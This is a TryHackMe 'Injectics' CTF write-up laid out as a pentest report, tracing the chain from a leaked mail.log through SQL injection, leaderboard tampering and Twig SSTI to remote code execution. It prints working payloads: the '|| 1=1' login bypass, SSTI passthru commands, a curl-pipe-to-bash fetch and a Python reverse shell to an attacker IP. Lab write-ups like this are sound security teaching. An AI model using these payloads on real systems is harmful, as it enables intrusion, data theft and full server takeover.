# Injectics CTF — TryHackMe Room Writeup

<div align="center">

![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=3000&pause=1000&color=00FF00&center=true&vCenter=true&width=700&lines=Injectics+CTF+Writeup;TryHackMe+Room;Web+Exploitation+%7C+SSTI+%7C+RCE;Full+Compromise+Achieved)

![GitHub last commit](https://img.shields.io/github/last-commit/username/repo?style=for-the-badge&color=green)
![TryHackMe](https://img.shields.io/badge/TryHackMe-Injectics-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-COMPLETED-brightgreen?style=for-the-badge)

</div>

---

## 📌 Overview

> **Injectics** is a web application CTF room on TryHackMe that simulates a realistic attack chain against a PHP/MySQL application. The room demonstrates how multiple common web vulnerabilities can be chained together for full system compromise — from information disclosure and SQL injection to server-side template injection (SSTI) and remote code execution (RCE).

<div align="center">

| **Category** | **Details** |
|:---:|:---:|
| 🎯 **Platform** | TryHackMe |
| 🔥 **Difficulty** | Medium |
| 🕸️ **Category** | Web Exploitation |
| ⏱️ **Time** | ~60 minutes |
| 🏁 **Flags** | 2 |

</div>

---

## 📊 Executive Summary

The Injectics web application was **fully compromised** by chaining several vulnerabilities:

<div align="center">

| Severity | Count | Findings |
|:---:|:---:|:---|
| 🔴 **Critical** | 3 | Default credentials exposed, SQL injection auth bypass, SSTI to RCE |
| 🟠 **High** | 1 | Unvalidated leaderboard tampering |
| 🟡 **Medium** | 4 | Client-side only validation, hidden admin login, exposed phpMyAdmin, insecure file permissions |
| 🔵 **Low** | 1 | Information disclosure & cookie hardening gaps |

</div>

### ⚡ Attack Chain Flow

```mermaid
graph LR
    A[🔍 Recon] --> B[📄 mail.log Leak]
    B --> C[💉 SQL Injection]
    C --> D[✏️ Leaderboard Tamper]
    D --> E[🔑 Admin Access]
    E --> F[🧨 SSTI Injection]
    F --> G[💻 Reverse Shell]
    G --> H[🏁 Flag 2]
🖥️ Environment
<div align="center">
Item	Details
🎯 Target Application	Injectics 2024 (PHP, jQuery, Bootstrap, MySQL)
🌐 Target Hosts	10.145.189.138 (recon), 10.144.157.219 (exploitation)
💀 Attacker Host	Kali Linux, tun0 = 192.168.130.136
🛠️ Tools Used	nmap 7.99, gobuster 3.8.2, Burp Suite Pro, netcat, Python http.server
</div>
🔍 Reconnaissance
📡 Port Scan
bash
nmap -sC -sV -p- 10.145.189.138
Results:

diff
+ Port 22/tcp   → OpenSSH 8.2p1 Ubuntu (public key auth only)
+ Port 80/tcp   → Apache httpd 2.4.41 (Ubuntu)
! PHPSESSID cookie issued WITHOUT HttpOnly flag
📂 Directory Enumeration
bash
gobuster dir -u http://10.145.189.138 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
Discovered Paths:

yaml
/flags/          → 403 Forbidden (flag file located here)
/css/, /js/      → Static assets
/javascript/     → Static assets
/vendor/         → Third-party libraries
/phpmyadmin/     → Publicly reachable login
/adminLogin007.php → Hidden admin login
/robots.txt      → 404 Not Found
🔎 Source Review Findings
📝 HTML footer comment discloses developer name and email

📝 Another comment reveals where mail is stored (mail.log)

📝 script.js contains a client-side keyword blacklist: or, and, union, select, quotes

🧨 Detailed Findings
🔴 F-01: Default Credentials Exposed in Publicly Readable Mail Log
<table> <tr> <td><b>Severity</b></td> <td>🔴 Critical</td> </tr> <tr> <td><b>Location</b></td> <td><code>/mail.log</code> (web root, no auth required)</td> </tr> </table>
📖 Description:
The file mail.log is publicly accessible and contains an internal email with plaintext credentials for the superadmin and dev accounts. The email also reveals that InjecticsService re-inserts these default credentials every minute — meaning they persist even if changed.

💥 Impact: Anyone can obtain administrator credentials without any prior access.

🔁 Reproduction:

Request /mail.log in browser → loads without login

Record superadmin and dev credentials from email body

Standard login returns "Invalid email or password"

Hidden admin login at /adminLogin007.php accepts superadmin credentials → admin dashboard

🛡️ Remediation:

Remove mail.log and all internal files from web root

Deny requests for *.log and mail files

Rotate all passwords immediately

Store passwords as salted hashes using password_hash()

🔴 F-02: SQL Injection in Login Function → Auth Bypass
<table> <tr> <td><b>Severity</b></td> <td>🔴 Critical</td> </tr> <tr> <td><b>Location</b></td> <td><code>POST /functions.php</code>, <code>function=login</code>, parameter <code>username</code></td> </tr> </table>
📖 Description:
The login handler places the username value into a SQL statement without parameter binding. A keyword blacklist exists in the browser, but the server does not enforce the same protection for every operator.

💥 Impact: Authentication bypass for any account, including administrators.

🔁 Reproduction:

http
POST /functions.php HTTP/1.1
Host: 10.144.157.219
Content-Type: application/x-www-form-urlencoded

function=login&username=a' || 1=1 - - -&password=x
Response:

json
{
  "status": "success",
  "message": "Login successful",
  "is_admin": "true",
  "first_name": "dev",
  "redirect": "dashboard.php"
}
⚠️ OR 1=1 was blocked, but || 1=1 worked → incomplete blacklist

🛡️ Remediation:

Replace string concatenation with prepared statements

Do not rely on keyword blacklists

Use least-privilege database account

🟡 F-03: Client-Side Only Input Validation
<table> <tr> <td><b>Severity</b></td> <td>🟡 Medium</td> </tr> <tr> <td><b>Location</b></td> <td><code>script.js</code> (login form handler)</td> </tr> </table>
📖 Description:
The login script blocks keywords (or, and, union, select, quotes) before the request is sent. The check runs entirely in the browser, so anyone can bypass it by sending requests directly via Burp.

💥 Impact: False sense of security; blacklist contents guide attackers.

🛡️ Remediation:

Enforce every validation rule on the server side

Combine with parameterized queries and output encoding

🟡 F-04: Hidden Admin Login Panel
<table> <tr> <td><b>Severity</b></td> <td>🟡 Medium</td> </tr> <tr> <td><b>Location</b></td> <td><code>login.php</code> → <code>/adminLogin007.php</code></td> </tr> </table>
📖 Description:
The public login page includes a "Login as Admin" button linking to a separate admin page with no additional protection. Relies on obscurity, not access control.

💥 Impact: Admin login available to automated password guessing with no rate limiting.

🛡️ Remediation:

Restrict admin area to trusted networks/VPN

Enforce MFA, rate limiting, account lockout

Remove admin link from public page

🟠 F-05: Unvalidated Leaderboard Tampering
<table> <tr> <td><b>Severity</b></td> <td>🟠 High</td> </tr> <tr> <td><b>Location</b></td> <td><code>edit_leaderboard.php</code></td> </tr> </table>
📖 Description:
The leaderboard edit form trusts submitted values. An authenticated dev user could change the gold count for USA from 22 to 25, and the public leaderboard displayed the changed values.

💥 Impact: Integrity and authorization failure.

🔁 Reproduction:

Log in as dev via SQL injection bypass

Open Edit for rank 1 (USA)

Intercept POST in Burp Proxy; change gold=25

Forward → public leaderboard shows gold 25

🛡️ Remediation:

Check user role on server before any write operation

Validate every field as integer within expected range

Use CSRF tokens on state-changing forms

🔴 F-06: SSTI in Profile Update → RCE
<table> <tr> <td><b>Severity</b></td> <td>🔴 Critical</td> </tr> <tr> <td><b>Location</b></td> <td><code>update_profile.php</code> (First Name) → <code>dashboard.php</code></td> </tr> </table>
📖 Description:
The First Name value is evaluated by a PHP template engine with Twig-style syntax before display. Expressions are executed rather than shown as text.

🔁 Reproduction:

twig
Step 1: {{5*5}}                        → Dashboard shows: 25
Step 2: {{['id','']|sort('passthru')}} → uid=33(www-data)
Step 3: {{['curl 192.168.130.136|bash','']|sort('passthru')}} → Reverse shell
🎯 Reverse Shell Payload:

bash
# On attacker machine
python3 -m http.server 80

# Payload in index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.130.136",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Listener
nc -lvnp 443
🛡️ Remediation:

Never pass user input as template source

Keep user data as template variables; enable auto-escaping

Deny dangerous filters/callbacks (passthru, system, exec)

🟡 F-07: Publicly Reachable phpMyAdmin & Directory Structure
<table> <tr> <td><b>Severity</b></td> <td>🟡 Medium</td> </tr> <tr> <td><b>Location</b></td> <td><code>/phpmyadmin/</code>, <code>/flags/</code>, <code>/js/</code>, <code>/vendor/</code></td> </tr> </table>
📖 Description:
phpMyAdmin is installed under the public web root. Gobuster revealed /flags/ and vendor directories.

💥 Impact: Second authentication target; directory discovery aids finding sensitive paths.

🛡️ Remediation:

Remove phpMyAdmin from public web root or restrict to localhost/VPN

Disable directory indexing (Options -Indexes)

Return generic 404 for hidden directories

🟡 F-08: Insecure File Permissions & Leftover Swap File
<table> <tr> <td><b>Severity</b></td> <td>🟡 Medium</td> </tr> <tr> <td><b>Location</b></td> <td><code>/var/www/html</code> (<code>.conn.php.swp</code>, <code>injecticsService.php</code>)</td> </tr> </table>
📖 Description:
Files owned by ubuntu, most group-writable. Vim swap file .conn.php.swp left in public web root. injecticsService.php executable and group-writable.

💥 Impact: Swap file may disclose DB credentials; writable service script can persist access.

🛡️ Remediation:

Delete swap/backup files from deployed directories

Own application files by deployment account; make read-only for web user

Move background services out of web root

🔵 F-09: Information Disclosure & Cookie Hardening Gaps
<table> <tr> <td><b>Severity</b></td> <td>🔵 Low</td> </tr> <tr> <td><b>Location</b></td> <td>HTML source, HTTP headers, dashboard output, session cookie</td> </tr> </table>
📖 Description:
Multiple small leaks:

Footer comment names developer and email

Comment states where mail is stored

Server banner shows exact Apache version and OS

Dashboard prints raw PHP output (uid, gid, arrays)

PHPSESSID cookie issued without HttpOnly flag

🛡️ Remediation:

Remove developer comments from production HTML

Set ServerTokens Prod and ServerSignature Off

Set HttpOnly, Secure, and SameSite on session cookie

🏁 Flags Captured
<div align="center">
#	Flag	Location
🥇	THM{INJECTICS_ADMIN_PANEL_007}	Admin dashboard after superadmin login
🥈	THM{5735172b6c147f4dd649872f73e0fdea}	5d8af1dc14503c7e4bdc8e51a3469f48.txt in /var/www/html/flags
</div>
⏱️ Timeline
<div align="center">
Date/Time (IST)	Activity
15 Oct, 21:52–21:59	Room start, nmap scan, homepage, robots.txt, source review
15 Oct, 22:00–22:05	Notes review, mail.log discovered, login attempts
15 Oct, 22:08–22:14	Gobuster, admin source review, phpMyAdmin, SSH attempts
16 Oct, 10:41–10:55	Client script review, Burp SQL injection, leaderboard tampering
16 Oct, 10:57–11:09	Hidden admin login, profile tests, template expression confirmed
16 Oct, 11:44–11:56	SSTI payload research, command execution confirmed
16 Oct, 12:47–13:00	Payload preparation, HTTP delivery, reverse shell, Flag 2
</div>
🛠️ Prioritized Remediation Roadmap
<div align="center">
Priority	Action	Addresses
🔴 Immediate	Remove mail.log; rotate passwords; disable credential insertion	F-01, F-08
🔴 Immediate	Replace login query with prepared statements; hash passwords	F-02
🔴 Immediate	Remove template evaluation; auto-escape; restrict callbacks	F-06
🟠 Short term	Enforce role-based checks; server-side validation; CSRF	F-05, F-03
🟠 Short term	Restrict phpMyAdmin; VPN + MFA for admin; remove public link	F-07, F-04
🟠 Short term	Fix file ownership/permissions; delete swap files	F-08
</div>
🎓 Conclusion
The Injectics application can be fully compromised by a low-skill attacker, starting from public information and moving through credential disclosure, SQL injection, authorization failures, and template injection to remote code execution. Each weakness is common on its own, but together they demonstrate a pattern of trusting the client, relying on blacklists, and leaving sensitive files in the public web root.

🧰 Tools & References
<div align="center">
Tool	Purpose
🔍 nmap	Port scanning & service detection
📂 gobuster	Directory enumeration
🕷️ Burp Suite Pro	Request interception & manipulation
🐚 netcat	Reverse shell listener
🐍 Python http.server	Payload delivery
🔑 OpenSSH	SSH attempts
</div>
📚 References:

HackTricks SSTI Notes

PayloadsAllTheThings

PentestMonkey Reverse Shell Cheat Sheet

<div align="center">
⚠️ Disclaimer
This writeup is for educational purposes only.
All testing was performed against the TryHackMe Injectics room in a controlled lab environment.
No testing was performed against any system outside this lab.

